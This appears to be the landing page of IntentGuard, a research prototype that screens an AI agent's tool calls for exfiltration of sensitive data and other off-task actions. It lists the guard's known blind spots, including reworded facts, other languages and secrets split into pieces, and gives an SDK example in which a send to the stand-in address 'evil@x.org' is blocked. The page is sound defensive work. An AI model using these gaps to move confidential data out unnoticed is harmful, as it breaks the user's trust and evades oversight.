Research prototype

Check what an AI agent is about to do against what you actually asked for.

IntentGuard sits between an agent and its tools. Before each call runs, it compares the call with the user's task, the data involved, the destination, and what the session has already done.

Replay real decisions

Pick a situation, then run the agent's calls one at a time. Every verdict below was produced by the actual engine on synthetic files and a mock inbox; nothing is typed in by hand.

    How a call is judged

    Plain rules, no model in the loop, so the same call in the same state always gets the same answer and every answer names the rule behind it.

    1. The taskIs this file, action and destination part of what the user asked? Anything outside the task is stopped.
    2. The dataPublic, internal, confidential or secret. A task cannot reach above the level it was granted.
    3. The destinationLocal, approved, unknown or denylisted. Unknown places need a person.
    4. Where it came fromContent that left a sensitive file is recognised on the way out, even re-typed, encoded or split.
    5. The session so farEach suspicious step adds risk. Risk switches off abilities in stages.

      What the benchmark says, and how far to trust it

      Preliminary. The attack sets were written by the same person who built the engine, and a scripted agent plays them in a synthetic environment. They show the engine does what its author intended, not how it fares against an outside attacker. Rows marked "stand-in" are my deterministic re-creations of an idea from a paper, not the published systems.

      Harmful steps that run, and the cost to legitimate work, per system on the chosen set
      SystemHarmful steps that run (lower is better)Legitimate steps blockedLegitimate tasks finished untouched

      Numbers come from python -m bench.run at commit __RESULTS_COMMIT__. Brackets are 95% confidence intervals. "Finished untouched" is the share of legitimate tasks in which no step was blocked or sent for review, so a system that blocks everything is not a good answer. The first column counts individual harmful steps, not whole attacks.

      What it does not do

      • Reworded facts get through. A rounded figure, another language, slang, or a comparison with no numbers is not recognised (5 of 14 attacks in the newest set are known misses).
      • The first short piece of a split secret can leave before the whole is recognisable, as the replay above shows.
      • No independent test yet. Every attack set shares an author with the engine. An outside set is the next step for the evidence.
      • Some friction. About 4.5% of steps on the held-out generated set go to a human, and a legitimate email that repeats a sensitive number will too.
      • Not compared with the real systems. Progent, The Task Shield and CaMeL are represented only by stand-ins that capture one idea each.
      • Mock tools. The tools in these runs are synthetic. Network-level isolation of a real agent is not verified.

      The full list, with the measurements behind each, is in docs/findings.md.

      Try it

      Run the service with the dashboard backend, or guard your own Python functions in a few lines.

      git clone 
cd IntentGuard
pip install -e ".[dev]"
intentguard serve --demo        # http://127.0.0.1:8000
python -m pytest -q
      from intentguard.sdk import Guard

guard = Guard(classes={"hr/salary.csv": "CONFIDENTIAL"}, trust={"bob@x.org": "approved"})

@guard.tool("read", resource_arg="path")
def read_file(path): ...

@guard.tool("send", dest_arg="to")
def send_email(to, body): ...

session = guard.session("Read notes/a.txt and email bob@x.org a summary",
                        {"resources": ["notes/*"], "destinations": ["bob@x.org"]})
session.call("send_email", to="evil@x.org", body="...")   # blocked, with the reason
